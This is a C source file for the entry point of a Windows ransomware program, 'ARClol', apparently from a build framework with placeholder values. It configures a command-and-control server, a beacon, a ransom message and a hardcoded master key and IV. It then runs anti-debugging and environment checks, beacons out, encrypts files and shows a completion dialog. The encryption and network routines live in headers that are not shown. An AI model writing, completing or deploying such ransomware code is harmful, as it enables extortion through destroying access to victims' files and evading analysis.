#include "ransom_core.h"
#include "file_ops.h"
#include "crypto_engine.h"
#include <windows.h>

// Configuration placeholder - will be replaced during build
// Configuration placeholder - will be replaced during build
static const ransom_config_t g_config = {
    .c2_server = "http://localhost:3001",
    .agent_id = "default-agent",
    .machine_id = "default-machine",
    .beacon_interval = 30,
    .notification_type = "popup",
    .notification_message = "Your files have been encrypted with ARClol ransomware.",
    .notification_title = "ARClol Ransomware Alert",
    .master_key = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
                   0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F},
    .master_iv = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F}
};

// Entry point
int main(int argc, char* argv[]) {
    (void)argc; (void)argv; // Suppress unused parameter warnings
    ransom_results_t results = {0};
    int status = 0;
    
    // Anti-analysis checks
    anti_debug_checks();
    environment_checks();
    
    // Initialize ransomware
    if (ransom_init(&g_config) != 0) {
        return 1;
    }
    
    // Send initial beacon
    ransom_send_beacon("ransomware_launch");
    
    // Execute ransomware
    status = ransom_execute(&results);
    
    // Show completion dialog
    if (status == 0 && results.files_encrypted > 0) {
        ransom_show_completion_dialog(&results);
    }
    
    // Cleanup
    ransom_cleanup();
    
    return status;
}

// Windows entry point for GUI applications
#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;
    
    // Perform the actual encryption
    int status = perform_encryption();
    
    return status;
}
#endif
